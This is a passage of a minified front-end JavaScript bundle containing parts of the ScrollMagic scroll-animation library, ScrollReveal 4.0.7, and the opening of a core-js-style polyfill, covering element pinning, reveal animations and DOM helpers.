e=f===c,t=o.info("vertical"),n=w.spacer.firstChild,r=i.isMarginCollapseType(i.css(w.spacer,"display")),a={};w.relSize.width||w.relSize.autoFullWidth?e?i.css(_,{width:i.get.width(w.spacer)}):i.css(_,{width:"100%"}):(a["min-width"]=i.get.width(t?_:n,!0,!0),a.width=e?a["min-width"]:"auto"),w.relSize.height?e?i.css(_,{height:i.get.height(w.spacer)-(w.pushFollowers?h.duration:0)}):i.css(_,{height:"100%"}):(a["min-height"]=i.get.height(t?n:_,!0,!r),a.height=e?a["min-height"]:"auto"),w.pushFollowers&&(a["padding"+(t?"Top":"Left")]=h.duration*A,a["padding"+(t?"Bottom":"Right")]=h.duration*(1-A)),i.css(w.spacer,a)}},F=function(){o&&_&&f===c&&!o.info("isDocument")&&P()},L=function(){o&&_&&f===c&&((w.relSize.width||w.relSize.autoFullWidth)&&i.get.width(window)!=i.get.width(w.spacer.parentNode)||w.relSize.height&&i.get.height(window)!=i.get.height(w.spacer.parentNode))&&I()},O=function(e){o&&_&&f===c&&!o.info("isDocument")&&(e.preventDefault(),o._setScrollPos(o.info("scrollPos")-((e.wheelDelta||e[o.info("vertical")?"wheelDeltaY":"wheelDeltaX"])/3||30*-e.detail)))};this.setPin=function(e,n){var r=n&&n.hasOwnProperty("pushFollowers");if(n=i.extend({},{pushFollowers:!0,spacerClass:"scrollmagic-pin-spacer"},n),!(e=i.get.elements(e)[0]))return b(1,"ERROR calling method 'setPin()': Invalid pin element supplied."),p;if("fixed"===i.css(e,"position"))return b(1,"ERROR calling method 'setPin()': Pin does not work with elements that are positioned 'fixed'."),p;if(_){if(_===e)return p;p.removePin()}var a=(_=e).parentNode.style.display,o=["top","left","bottom","right","margin","marginLeft","marginRight","marginTop","marginBottom"];_.parentNode.style.display="none";var s="absolute"!=i.css(_,"position"),l=i.css(_,o.concat(["display"])),c=i.css(_,["width","height"]);_.parentNode.style.display=a,!s&&n.pushFollowers&&(b(2,"WARNING: If the pinned element is positioned absolutely pushFollowers will be disabled."),n.pushFollowers=!1),window.setTimeout((function(){_&&0===h.duration&&r&&n.pushFollowers&&b(2,"WARNING: pushFollowers =",!0,"has no effect, when scene duration is 0.")}),0);var u=_.parentNode.insertBefore(document.createElement("div"),_),d=i.extend(l,{position:s?"relative":"absolute",boxSizing:"content-box",mozBoxSizing:"content-box",webkitBoxSizing:"content-box"});if(s||i.extend(d,i.css(_,["width","height"])),i.css(u,d),u.setAttribute(t,""),i.addClass(u,n.spacerClass),w={spacer:u,relSize:{width:"%"===c.width.slice(-1),height:"%"===c.height.slice(-1),autoFullWidth:"auto"===c.width&&s&&i.isMarginCollapseType(l.display)},pushFollowers:n.pushFollowers,inFlow:s},!_.___origStyle){_.___origStyle={};var f=_.style;o.concat(["width","height","position","boxSizing","mozBoxSizing","webkitBoxSizing"]).forEach((function(e){_.___origStyle[e]=f[e]||""}))}return w.relSize.width&&i.css(u,{width:c.width}),w.relSize.height&&i.css(u,{height:c.height}),u.appendChild(_),i.css(_,{position:s?"relative":"absolute",margin:"auto",top:"auto",left:"auto",bottom:"auto",right:"auto"}),(w.relSize.width||w.relSize.autoFullWidth)&&i.css(_,{boxSizing:"border-box",mozBoxSizing:"border-box",webkitBoxSizing:"border-box"}),window.addEventListener("scroll",F),window.addEventListener("resize",F),window.addEventListener("resize",L),_.addEventListener("mousewheel",O),_.addEventListener("DOMMouseScroll",O),b(3,"added pin"),P(),p},this.removePin=function(e){if(_){if(f===c&&P(!0),e||!o){var n=w.spacer.firstChild;if(n.hasAttribute(t)){var r=w.spacer.style,a={};["margin","marginLeft","marginRight","marginTop","marginBottom"].forEach((function(e){a[e]=r[e]||""})),i.css(n,a)}w.spacer.parentNode.insertBefore(n,w.spacer),w.spacer.parentNode.removeChild(w.spacer),_.parentNode.hasAttribute(t)||(i.css(_,_.___origStyle),delete _.___origStyle)}window.removeEventListener("scroll",F),window.removeEventListener("resize",F),window.removeEventListener("resize",L),_.removeEventListener("mousewheel",O),_.removeEventListener("DOMMouseScroll",O),_=void 0,b(3,"removed pin (reset: "+(e?"true":"false")+")")}return p};var N,D=[];return p.on("destroy.internal",(function(e){p.removeClassToggle(e.reset)})),this.setClassToggle=function(e,t){var n=i.get.elements(e);return 0!==n.length&&i.type.String(t)?(0<D.length&&p.removeClassToggle(),N=t,D=n,p.on("enter.internal_class leave.internal_class",(function(e){var t="enter"===e.type?i.addClass:i.removeClass;D.forEach((function(e,n){t(e,N)}))}))):b(1,"ERROR calling method 'setClassToggle()': Invalid "+(0===n.length?"element":"classes")+" supplied."),p},this.removeClassToggle=function(e){return e&&D.forEach((function(e,t){i.removeClass(e,N)})),p.off("start.internal_class end.internal_class"),N=void 0,D=[],p},function(){for(var e in h)d.hasOwnProperty(e)||(b(2,'WARNING: Unknown option "'+e+'"'),delete h[e]);for(var t in d)T(t);B()}(),p};var r={defaults:{duration:0,offset:0,triggerElement:void 0,triggerHook:.5,reverse:!0,loglevel:2},validate:{offset:function(e){if(e=parseFloat(e),!i.type.Number(e))throw['Invalid value for option "offset":',e];return e},triggerElement:function(e){if(e=e||void 0){var t=i.get.elements(e)[0];if(!t||!t.parentNode)throw['Element defined in option "triggerElement" was not found:',e];e=t}return e},triggerHook:function(e){var t={onCenter:.5,onEnter:1,onLeave:0};if(i.type.Number(e))e=Math.max(0,Math.min(parseFloat(e),1));else{if(!(e in t))throw['Invalid value for option "triggerHook": ',e];e=t[e]}return e},reverse:function(e){return!!e},loglevel:function(e){if(e=parseInt(e),!i.type.Number(e)||e<0||3<e)throw['Invalid value for option "loglevel":',e];return e}},shifts:["duration","offset","triggerHook"]};e.Scene.addOption=function(t,n,i,a){t in r.defaults?e._util.log(1,"[static] ScrollMagic.Scene -> Cannot add Scene option '"+t+"', because it already exists."):(r.defaults[t]=n,r.validate[t]=i,a&&r.shifts.push(t))},e.Scene.extend=function(t){var n=this;e.Scene=function(){return n.apply(this,arguments),this.$super=i.extend({},this),t.apply(this,arguments)||this},i.extend(e.Scene,n),e.Scene.prototype=n.prototype,e.Scene.prototype.constructor=e.Scene},e.Event=function(e,t,n,r){for(var i in r=r||{})this[i]=r[i];return this.type=e,this.target=this.currentTarget=n,this.namespace=t||"",this.timeStamp=this.timestamp=Date.now(),this};var i=e._util=function(e){var t,n={},r=function(e){return parseFloat(e)||0},i=function(t){return t.currentStyle?t.currentStyle:e.getComputedStyle(t)},a=function(t,n,a,o){if((n=n===document?e:n)===e)o=!1;else if(!f.DomElement(n))return 0;t=t.charAt(0).toUpperCase()+t.substr(1).toLowerCase();var s=(a?n["offset"+t]||n["outer"+t]:n["client"+t]||n["inner"+t])||0;if(a&&o){var l=i(n);s+="Height"===t?r(l.marginTop)+r(l.marginBottom):r(l.marginLeft)+r(l.marginRight)}return s},o=function(e){return e.replace(/^[^a-z]+([a-z])/g,"$1").replace(/-([a-z])/g,(function(e){return e[1].toUpperCase()}))};n.extend=function(e){for(e=e||{},t=1;t<arguments.length;t++)if(arguments[t])for(var n in arguments[t])arguments[t].hasOwnProperty(n)&&(e[n]=arguments[t][n]);return e},n.isMarginCollapseType=function(e){return-1<["block","flex","list-item","table","-webkit-box"].indexOf(e)};var s=0,l=["ms","moz","webkit","o"],c=e.requestAnimationFrame,u=e.cancelAnimationFrame;for(t=0;!c&&t<l.length;++t)c=e[l[t]+"RequestAnimationFrame"],u=e[l[t]+"CancelAnimationFrame"]||e[l[t]+"CancelRequestAnimationFrame"];c||(c=function(t){var n=(new Date).getTime(),r=Math.max(0,16-(n-s)),i=e.setTimeout((function(){t(n+r)}),r);return s=n+r,i}),u||(u=function(t){e.clearTimeout(t)}),n.rAF=c.bind(e),n.cAF=u.bind(e);var d=["error","warn","log"],p=e.console||{};for(p.log=p.log||function(){},t=0;t<d.length;t++){var h=d[t];p[h]||(p[h]=p.log)}n.log=function(e){(d.length<e||e<=0)&&(e=d.length);var t=new Date,n=("0"+t.getHours()).slice(-2)+":"+("0"+t.getMinutes()).slice(-2)+":"+("0"+t.getSeconds()).slice(-2)+":"+("00"+t.getMilliseconds()).slice(-3),r=d[e-1],i=Array.prototype.splice.call(arguments,1),a=Function.prototype.bind.call(p[r],p);i.unshift(n),a.apply(p,i)};var f=n.type=function(e){return Object.prototype.toString.call(e).replace(/^\[object (.+)\]$/,"$1").toLowerCase()};f.String=function(e){return"string"===f(e)},f.Function=function(e){return"function"===f(e)},f.Array=function(e){return Array.isArray(e)},f.Number=function(e){return!f.Array(e)&&0<=e-parseFloat(e)+1},f.DomElement=function(e){return"object"===("undefined"==typeof HTMLElement?"undefined":_typeof2(HTMLElement))||"function"==typeof HTMLElement?e instanceof HTMLElement||e instanceof SVGElement:e&&"object"===_typeof2(e)&&null!==e&&1===e.nodeType&&"string"==typeof e.nodeName};var A=n.get={};return A.elements=function(t){var n=[];if(f.String(t))try{t=document.querySelectorAll(t)}catch(t){return n}if("nodelist"===f(t)||f.Array(t)||t instanceof NodeList)for(var r=0,i=n.length=t.length;r<i;r++){var a=t[r];n[r]=f.DomElement(a)?a:A.elements(a)}else(f.DomElement(t)||t===document||t===e)&&(n=[t]);return n},A.scrollTop=function(t){return t&&"number"==typeof t.scrollTop?t.scrollTop:e.pageYOffset||0},A.scrollLeft=function(t){return t&&"number"==typeof t.scrollLeft?t.scrollLeft:e.pageXOffset||0},A.width=function(e,t,n){return a("width",e,t,n)},A.height=function(e,t,n){return a("height",e,t,n)},A.offset=function(e,t){var n={top:0,left:0};if(e&&e.getBoundingClientRect){var r=e.getBoundingClientRect();n.top=r.top,n.left=r.left,t||(n.top+=A.scrollTop(),n.left+=A.scrollLeft())}return n},n.addClass=function(e,t){t&&(e.classList?e.classList.add(t):e.className+=" "+t)},n.removeClass=function(e,t){t&&(e.classList?e.classList.remove(t):e.className=e.className.replace(new RegExp("(^|\\b)"+t.split(" ").join("|")+"(\\b|$)","gi")," "))},n.css=function(e,t){if(f.String(t))return i(e)[o(t)];if(f.Array(t)){var n={},r=i(e);return t.forEach((function(e,t){n[e]=r[o(e)]})),n}for(var a in t){var s=t[a];s==parseFloat(s)&&(s+="px"),e.style[o(a)]=s}},n}(window||{});return e.Scene.prototype.addIndicators=function(){return e._util.log(1,"(ScrollMagic.Scene) -> ERROR calling addIndicators() due to missing Plugin 'debug.addIndicators'. Please make sure to include plugins/debug.addIndicators.js"),this},e.Scene.prototype.removeIndicators=function(){return e._util.log(1,"(ScrollMagic.Scene) -> ERROR calling removeIndicators() due to missing Plugin 'debug.addIndicators'. Please make sure to include plugins/debug.addIndicators.js"),this},e.Scene.prototype.setTween=function(){return e._util.log(1,"(ScrollMagic.Scene) -> ERROR calling setTween() due to missing Plugin 'animation.gsap'. Please make sure to include plugins/animation.gsap.js"),this},e.Scene.prototype.removeTween=function(){return e._util.log(1,"(ScrollMagic.Scene) -> ERROR calling removeTween() due to missing Plugin 'animation.gsap'. Please make sure to include plugins/animation.gsap.js"),this},e.Scene.prototype.setVelocity=function(){return e._util.log(1,"(ScrollMagic.Scene) -> ERROR calling setVelocity() due to missing Plugin 'animation.velocity'. Please make sure to include plugins/animation.velocity.js"),this},e.Scene.prototype.removeVelocity=function(){return e._util.log(1,"(ScrollMagic.Scene) -> ERROR calling removeVelocity() due to missing Plugin 'animation.velocity'. Please make sure to include plugins/animation.velocity.js"),this},e},"function"==typeof define&&define.amd?define(r):"object"===_typeof2(n)?t.exports=r():this.ScrollMagic=r()},{}],267:[function(e,t,n){var r,i;r=this,i=function(){var e={delay:0,distance:"0",duration:600,easing:"cubic-bezier(0.5, 0, 0, 1)",interval:0,opacity:0,origin:"bottom",rotate:{x:0,y:0,z:0},scale:1,cleanup:!1,container:document.documentElement,desktop:!0,mobile:!0,reset:!1,useDelay:"always",viewFactor:0,viewOffset:{top:0,right:0,bottom:0,left:0},afterReset:function(){},afterReveal:function(){},beforeReset:function(){},beforeReveal:function(){}},t=function(){document.documentElement.classList.add("sr"),document.body?document.body.style.height="100%":document.addEventListener("DOMContentLoaded",(function(){document.body.style.height="100%"}))},n=function(){return document.documentElement.classList.remove("sr"),{clean:function(){},destroy:function(){},reveal:function(){},sync:function(){},get noop(){return!0}}};function r(e){return"object"===_typeof2(window.Node)?e instanceof window.Node:null!==e&&"object"===_typeof2(e)&&"number"==typeof e.nodeType&&"string"==typeof e.nodeName}function i(e,t){if(void 0===t&&(t=document),e instanceof Array)return e.filter(r);if(r(e))return[e];if(n=e,i=Object.prototype.toString.call(n),"object"===_typeof2(window.NodeList)?n instanceof window.NodeList:null!==n&&"object"===_typeof2(n)&&"number"==typeof n.length&&/^\[object (HTMLCollection|NodeList|Object)\]$/.test(i)&&(0===n.length||r(n[0])))return Array.prototype.slice.call(e);var n,i;if("string"==typeof e)try{var a=t.querySelectorAll(e);return Array.prototype.slice.call(a)}catch(e){return[]}return[]}function a(e){return null!==e&&e instanceof Object&&(e.constructor===Object||"[object Object]"===Object.prototype.toString.call(e))}function o(e,t){if(a(e))return Object.keys(e).forEach((function(n){return t(e[n],n,e)}));if(e instanceof Array)return e.forEach((function(n,r){return t(n,r,e)}));throw new TypeError("Expected either an array or object literal.")}function s(e){for(var t=[],n=arguments.length-1;0<n--;)t[n]=arguments[n+1];if(this.constructor.debug&&console){var r="%cScrollReveal: "+e;t.forEach((function(e){return r+="\n — "+e}))}}function l(){var e=this,t={active:[],stale:[]},n={active:[],stale:[]},r={active:[],stale:[]};try{o(i("[data-sr-id]"),(function(e){var n=parseInt(e.getAttribute("data-sr-id"));t.active.push(n)}))}catch(e){throw e}o(this.store.elements,(function(e){-1===t.active.indexOf(e.id)&&t.stale.push(e.id)})),o(t.stale,(function(t){return delete e.store.elements[t]})),o(this.store.elements,(function(e){-1===r.active.indexOf(e.containerId)&&r.active.push(e.containerId),e.hasOwnProperty("sequence")&&-1===n.active.indexOf(e.sequence.id)&&n.active.push(e.sequence.id)})),o(this.store.containers,(function(e){-1===r.active.indexOf(e.id)&&r.stale.push(e.id)})),o(r.stale,(function(t){var n=e.store.containers[t].node;n.removeEventListener("scroll",e.delegate),n.removeEventListener("resize",e.delegate),delete e.store.containers[t]})),o(this.store.sequences,(function(e){-1===n.active.indexOf(e.id)&&n.stale.push(e.id)})),o(n.stale,(function(t){return delete e.store.sequences[t]}))}function c(e){var t,n=this;try{o(i(e),(function(e){var r=e.getAttribute("data-sr-id");if(null!==r){t=!0;var i=n.store.elements[r];i.callbackTimer&&window.clearTimeout(i.callbackTimer.clock),e.setAttribute("style",i.styles.inline.generated),e.removeAttribute("data-sr-id"),delete n.store.elements[r]}}))}catch(e){return s.call(this,"Clean failed.",e.message)}if(t)try{l.call(this)}catch(e){return s.call(this,"Clean failed.",e.message)}}function u(e){if(e.constructor!==Array)throw new TypeError("Expected array.");if(16===e.length)return e;if(6!==e.length)throw new RangeError("Expected array with either 6 or 16 values.");var t=d();return t[0]=e[0],t[1]=e[1],t[4]=e[2],t[5]=e[3],t[12]=e[4],t[13]=e[5],t}function d(){for(var e=[],t=0;t<16;t++)t%5==0?e.push(1):e.push(0);return e}function p(e,t){for(var n=u(e),r=u(t),i=[],a=0;a<4;a++)for(var o=[n[a],n[a+4],n[a+8],n[a+12]],s=0;s<4;s++){var l=4*s,c=[r[l],r[l+1],r[l+2],r[l+3]],d=o[0]*c[0]+o[1]*c[1]+o[2]*c[2]+o[3]*c[3];i[a+l]=d}return i}function h(e,t){var n=d();return n[0]=e,n[5]="number"==typeof t?t:e,n}var f=function(){var e={},t=document.documentElement.style;function n(n,r){if(void 0===r&&(r=t),n&&"string"==typeof n){if(e[n])return e[n];if("string"==typeof r[n])return e[n]=n;if("string"==typeof r["-webkit-"+n])return e[n]="-webkit-"+n;throw new RangeError('Unable to find "'+n+'" style property.')}throw new TypeError("Expected a string.")}return n.clearCache=function(){return e={}},n}();function A(e,t){void 0===t&&(t={});var n=t.pristine||this.pristine,r="always"===e.config.useDelay||"onload"===e.config.useDelay&&n||"once"===e.config.useDelay&&!e.seen,i=e.visible&&!e.revealed,a=!e.visible&&e.revealed&&e.config.reset;return t.reveal||i?function(e,t){var n=[e.styles.inline.generated,e.styles.opacity.computed,e.styles.transform.generated.final];t?n.push(e.styles.transition.generated.delayed):n.push(e.styles.transition.generated.instant),e.revealed=e.seen=!0,e.node.setAttribute("style",n.filter((function(e){return""!==e})).join(" ")),m.call(this,e,t)}.call(this,e,r):t.reset||a?function(e){var t=[e.styles.inline.generated,e.styles.opacity.generated,e.styles.transform.generated.initial,e.styles.transition.generated.instant];e.revealed=!1,e.node.setAttribute("style",t.filter((function(e){return""!==e})).join(" ")),m.call(this,e)}.call(this,e):void 0}function m(e,t){var n=this,r=t?e.config.duration+e.config.delay:e.config.duration,i=e.revealed?e.config.beforeReveal:e.config.beforeReset,a=e.revealed?e.config.afterReveal:e.config.afterReset,o=0;e.callbackTimer&&(o=Date.now()-e.callbackTimer.start,window.clearTimeout(e.callbackTimer.clock)),i(e.node),e.callbackTimer={start:Date.now(),clock:window.setTimeout((function(){a(e.node),e.callbackTimer=null,e.revealed&&!e.config.reset&&e.config.cleanup&&c.call(n,e.node)}),r-o)}}var v,g=(v=0,function(){return v++});function y(e,t){if(void 0===t&&(t=this.pristine),!e.visible&&e.revealed&&e.config.reset)return A.call(this,e,{reset:!0});var n=this.store.sequences[e.sequence.id],r=e.sequence.index;if(n){var i=new _(n,"visible",this.store),a=new _(n,"revealed",this.store);if(n.models={visible:i,revealed:a},!a.body.length){var o=n.members[i.body[0]],s=this.store.elements[o];if(s)return w.call(this,n,i.body[0],-1,t),w.call(this,n,i.body[0],1,t),A.call(this,s,{reveal:!0,pristine:t})}if(!n.blocked.head&&r===[].concat(a.head).pop()&&r>=[].concat(i.body).shift())return w.call(this,n,r,-1,t),A.call(this,e,{reveal:!0,pristine:t});if(!n.blocked.foot&&r===[].concat(a.foot).shift()&&r<=[].concat(i.body).pop())return w.call(this,n,r,1,t),A.call(this,e,{reveal:!0,pristine:t})}}function b(e){var t=Math.abs(e);if(isNaN(t))throw new RangeError("Invalid sequence interval.");this.id=g(),this.interval=Math.max(t,16),this.members=[],this.models={},this.blocked={head:!1,foot:!1}}function _(e,t,n){var r=this;this.head=[],this.body=[],this.foot=[],o(e.members,(function(e,i){var a=n.elements[e];a&&a[t]&&r.body.push(i)})),this.body.length&&o(e.members,(function(e,i){var a=n.elements[e];a&&!a[t]&&(i<r.body[0]?r.head.push(i):r.foot.push(i))}))}function w(e,t,n,r){var i=this,a=["head",null,"foot"][1+n],o=e.members[t+n],s=this.store.elements[o];e.blocked[a]=!0,setTimeout((function(){e.blocked[a]=!1,s&&y.call(i,s,r)}),e.interval)}function C(){var e=this;l.call(this),o(this.store.elements,(function(e){var t=[e.styles.inline.generated];e.visible?(t.push(e.styles.opacity.computed),t.push(e.styles.transform.generated.final),e.revealed=!0):(t.push(e.styles.opacity.generated),t.push(e.styles.transform.generated.initial),e.revealed=!1),e.node.setAttribute("style",t.filter((function(e){return""!==e})).join(" "))})),o(this.store.containers,(function(t){var n=t.node===document.documentElement?window:t.node;n.addEventListener("scroll",e.delegate),n.addEventListener("resize",e.delegate)})),this.delegate(),this.initTimeout=null}function x(e){return void 0===e&&(e=navigator.userAgent),/Android|iPhone|iPad|iPod/i.test(e)}function S(e){for(var t=[],n=arguments.length-1;0<n--;)t[n]=arguments[n+1];if(a(e))return o(t,(function(t){o(t,(function(t,n){a(t)?(e[n]&&a(e[n])||(e[n]={}),S(e[n],t)):e[n]=t}))})),e;throw new TypeError("Target must be an object literal.")}function k(t,n,r){var a=this;void 0===n&&(n={}),void 0===r&&(r=!1);var l,A=[],m=n.interval||e.interval;try{m&&(l=new b(m));var v=i(t);if(!v.length)throw new Error("Invalid reveal target.");o(v.reduce((function(e,t){var r={},s=t.getAttribute("data-sr-id");s?(S(r,a.store.elements[s]),r.node.setAttribute("style",r.styles.inline.computed)):(r.id=g(),r.node=t,r.seen=!1,r.revealed=!1,r.visible=!1);var m=S({},r.config||a.defaults,n);if(!m.mobile&&x()||!m.desktop&&!x())return s&&c.call(a,r),e;var v,y=i(m.container)[0];if(!y)throw new Error("Invalid container.");return y.contains(t)&&(null===(v=function(e){for(var t=[],n=arguments.length-1;0<n--;)t[n]=arguments[n+1];var r=null;return o(t,(function(t){o(t,(function(t){null===r&&t.node===e&&(r=t.id)}))})),r}(y,A,a.store.containers))&&(v=g(),A.push({id:v,node:y})),r.config=m,r.containerId=v,r.styles=function(e){var t=window.getComputedStyle(e.node),n=t.position,r=e.config,i={},a=(e.node.getAttribute("style")||"").match(/[\w-]+\s*:\s*[^;]+\s*/gi)||[];i.computed=a?a.map((function(e){return e.trim()})).join("; ")+";":"",i.generated=a.some((function(e){return e.match(/visibility\s?:\s?visible/i)}))?i.computed:a.concat(["visibility: visible"]).map((function(e){return e.trim()})).join("; ")+";";var o,s,l,c,A,m,v,g,y,b,_,w,C,x=parseFloat(t.opacity),S=isNaN(parseFloat(r.opacity))?parseFloat(t.opacity):parseFloat(r.opacity),k={computed:x!==S?"opacity: "+x+";":"",generated:x!==S?"opacity: "+S+";":""},M=[];if(parseFloat(r.distance)){var B="top"===r.origin||"bottom"===r.origin?"Y":"X",E=r.distance;"top"!==r.origin&&"left"!==r.origin||(E=/^-/.test(E)?E.substr(1):"-"+E);var T=E.match(/(^-?\d+\.?\d?)|(em$|px$|%$)/g),P=T[0];switch(T[1]){case"em":E=parseInt(t.fontSize)*P;break;case"px":E=P;break;case"%":E="Y"===B?e.node.getBoundingClientRect().height*P/100:e.node.getBoundingClientRect().width*P/100;break;default:throw new RangeError("Unrecognized or missing distance unit.")}"Y"===B?M.push((l=E,(c=d())[13]=l,c)):M.push((o=E,(s=d())[12]=o,s))}r.rotate.x&&M.push((A=r.rotate.x,m=Math.PI/180*A,(v=d())[5]=v[10]=Math.cos(m),v[6]=v[9]=Math.sin(m),v[9]*=-1,v)),r.rotate.y&&M.push((g=r.rotate.y,y=Math.PI/180*g,(b=d())[0]=b[10]=Math.cos(y),b[2]=b[8]=Math.sin(y),b[2]*=-1,b)),r.rotate.z&&M.push((_=r.rotate.z,w=Math.PI/180*_,(C=d())[0]=C[5]=Math.cos(w),C[1]=C[4]=Math.sin(w),C[4]*=-1,C)),1!==r.scale&&(0===r.scale?M.push(h(2e-4)):M.push(h(r.scale)));var I={};if(M.length){I.property=f("transform"),I.computed={raw:t[I.property],matrix:function(e){if("string"==typeof e){var t=e.match(/matrix(3d)?\(([^)]+)\)/);if(t)return u(t[2].split(", ").map(parseFloat))}return d()}(t[I.property])},M.unshift(I.computed.matrix);var F=M.reduce(p);I.generated={initial:I.property+": matrix3d("+F.join(", ")+");",final:I.property+": matrix3d("+I.computed.matrix.join(", ")+");"}}else I.generated={initial:"",final:""};var L={};if(k.generated||I.generated.initial){L.property=f("transition"),L.computed=t[L.property],L.fragments=[];var O=r.delay,N=r.duration,D=r.easing;k.generated&&L.fragments.push({delayed:"opacity "+N/1e3+"s "+D+" "+O/1e3+"s",instant:"opacity "+N/1e3+"s "+D+" 0s"}),I.generated.initial&&L.fragments.push({delayed:I.property+" "+N/1e3+"s "+D+" "+O/1e3+"s",instant:I.property+" "+N/1e3+"s "+D+" 0s"}),L.computed&&!L.computed.match(/all 0s|none 0s/)&&L.fragments.unshift({delayed:L.computed,instant:L.computed});var R=L.fragments.reduce((function(e,t,n){return e.delayed+=0===n?t.delayed:", "+t.delayed,e.instant+=0===n?t.instant:", "+t.instant,e}),{delayed:"",instant:""});L.generated={delayed:L.property+": "+R.delayed+";",instant:L.property+": "+R.instant+";"}}else L.generated={delayed:"",instant:""};return{inline:i,opacity:k,position:n,transform:I,transition:L}}(r),l&&(r.sequence={id:l.id,index:l.members.length},l.members.push(r.id)),e.push(r)),e}),[]),(function(e){(a.store.elements[e.id]=e).node.setAttribute("data-sr-id",e.id)}))}catch(t){return s.call(this,"Reveal failed.",t.message)}o(A,(function(e){a.store.containers[e.id]={id:e.id,node:e.node}})),l&&(this.store.sequences[l.id]=l),!0!==r&&(this.store.history.push({target:t,options:n}),this.initTimeout&&window.clearTimeout(this.initTimeout),this.initTimeout=window.setTimeout(C.bind(this),0))}var M,B=Math.sign||function(e){return(0<e)-(e<0)||+e},E=(M=Date.now(),function(e){var t=Date.now();16<t-M?e(M=t):setTimeout((function(){return E(e)}),0)}),T=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||E;function P(e,t){for(var n=t?e.node.clientHeight:e.node.offsetHeight,r=t?e.node.clientWidth:e.node.offsetWidth,i=0,a=0,o=e.node;isNaN(o.offsetTop)||(i+=o.offsetTop),isNaN(o.offsetLeft)||(a+=o.offsetLeft),o=o.offsetParent;);return{bounds:{top:i,right:a+r,bottom:i+n,left:a},height:n,width:r}}function I(e,t){var n=this;void 0===e&&(e={type:"init"}),void 0===t&&(t=this.store.elements),T((function(){var r="init"===e.type||"resize"===e.type;o(n.store.containers,(function(e){r&&(e.geometry=P.call(n,e,!0));var t=function(e){var t,n;return n=e.node===document.documentElement?(t=window.pageYOffset,window.pageXOffset):(t=e.node.scrollTop,e.node.scrollLeft),{top:t,left:n}}.call(n,e);e.scroll&&(e.direction={x:B(t.left-e.scroll.left),y:B(t.top-e.scroll.top)}),e.scroll=t})),o(t,(function(e){(r||void 0===e.geometry)&&(e.geometry=P.call(n,e)),e.visible=function(e){void 0===e&&(e={});var t=this.store.containers[e.containerId];if(t){var n=Math.max(0,Math.min(1,e.config.viewFactor)),r=e.config.viewOffset,i=e.geometry.bounds.top+e.geometry.height*n,a=e.geometry.bounds.right-e.geometry.width*n,o=e.geometry.bounds.bottom-e.geometry.height*n,s=e.geometry.bounds.left+e.geometry.width*n,l=t.geometry.bounds.top+t.scroll.top+r.top,c=t.geometry.bounds.right+t.scroll.left-r.right,u=t.geometry.bounds.bottom+t.scroll.top-r.bottom,d=t.geometry.bounds.left+t.scroll.left+r.left;return i<u&&d<a&&l<o&&s<c||"fixed"===e.styles.position}}.call(n,e)})),o(t,(function(e){e.sequence?y.call(n,e):A.call(n,e)})),n.pristine=!1}))}var F,L,O,N,D,R,j,U;function $(r){var a;if(void 0===r&&(r={}),void 0===this||Object.getPrototypeOf(this)!==$.prototype)return new $(r);if(!$.isSupported())return s.call(this,"Instantiation failed.","This browser is not supported."),n();try{a=S({},R||e,r)}catch(r){return s.call(this,"Invalid configuration.",r.message),n()}try{if(!i(a.container)[0])throw new Error("Invalid container.")}catch(r){return s.call(this,r.message),n()}return!(R=a).mobile&&x()||!R.desktop&&!x()?(s.call(this,"This device is disabled.","desktop: "+R.desktop,"mobile: "+R.mobile),n()):(t(),this.store={containers:{},elements:{},history:[],sequences:{}},this.pristine=!0,F=F||I.bind(this),L=L||function(){var e=this;o(this.store.elements,(function(e){e.node.setAttribute("style",e.styles.inline.generated),e.node.removeAttribute("data-sr-id")})),o(this.store.containers,(function(t){var n=t.node===document.documentElement?window:t.node;n.removeEventListener("scroll",e.delegate),n.removeEventListener("resize",e.delegate)})),this.store={containers:{},elements:{},history:[],sequences:{}}}.bind(this),O=O||k.bind(this),N=N||c.bind(this),D=D||function(){var e=this;o(this.store.history,(function(t){k.call(e,t.target,t.options,!0)})),C.call(this)}.bind(this),Object.defineProperty(this,"delegate",{get:function(){return F}}),Object.defineProperty(this,"destroy",{get:function(){return L}}),Object.defineProperty(this,"reveal",{get:function(){return O}}),Object.defineProperty(this,"clean",{get:function(){return N}}),Object.defineProperty(this,"sync",{get:function(){return D}}),Object.defineProperty(this,"defaults",{get:function(){return R}}),Object.defineProperty(this,"version",{get:function(){return"4.0.7"}}),Object.defineProperty(this,"noop",{get:function(){return!1}}),U||(U=this))}return $.isSupported=function(){return("transform"in(t=document.documentElement.style)||"WebkitTransform"in t)&&("transition"in(e=document.documentElement.style)||"WebkitTransition"in e);var e,t},Object.defineProperty($,"debug",{get:function(){return j||!1},set:function(e){return j="boolean"==typeof e?e:j}}),$(),$},"object"===_typeof2(n)&&void 0!==t?t.exports=i():"function"==typeof define&&define.amd?define(i):(r=r||self).ScrollReveal=i()},{}],268:[function(e,t,n){(function(e){(function(){var r,i;r=this,i=function(){var t="undefined"!=typeof globalThis?globalThis:"undefined"!=typeof window?window:void 0!==e?e:"undefined"!=typeof self?self:{};function n(e,t){return e(t={exports:{}},t.exports),t.exports}var r,i,a,o="object",s=function(e){return e&&e.Math==Math&&e},l=s(("undefined"==typeof globalThis?"undefined":_typeof2(globalThis))==o&&globalThis)||s(("undefined"==typeof window?"undefined":_typeof2(window))==o&&window)||s(("undefined"==typeof self?"undefined":_typeof2(self))==o&&self)||s(_typeof2(t)==o&&t)||Function("return this")(),c=function(e){try{return!!e()}catch(e){return!0}},u=!c((function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})),d={}.propertyIsEnumerable,p=Object.getOwnPropertyDescriptor,h={f:p&&!d.call({1:2},1)?function(e){var t=p(this,e);return!!t&&t.enumerable}:d},f=function(e,t){return{enumerable:!(1&e),configurable:!(2&e),writable:!(4&e),value:t}},A={}.toString,m=function(e){return A.call(e).slice(8,-1)},v="".split,g=c((function(){return!Object("z").propertyIsEnumerable(0)}))?function(e){return"String"==m(e)?v.call(e,""):Object(e)}:Object,y=function(e){if(null==e)throw TypeError("Can't call method on "+e);return e},b=function(e){return g(y(e))},_=function(e){return"object"===_typeof2(e)?null!==e:"function"==typeof e},w=function(e,t){if(!_(e))return e;var n,r;if(t&&"function"==typeof(n=e.toString)&&!_(r=n.call(e)))return r;if("function"==typeof(n=e.valueOf)&&!_(r=n.call(e)))return r;if(!t&&"function"==typeof(n=e.toString)&&!_(r=n.call(e)))return r;throw TypeError("Can't convert object to primitive value")},C={}.hasOwnProperty,x=function(e,t){return 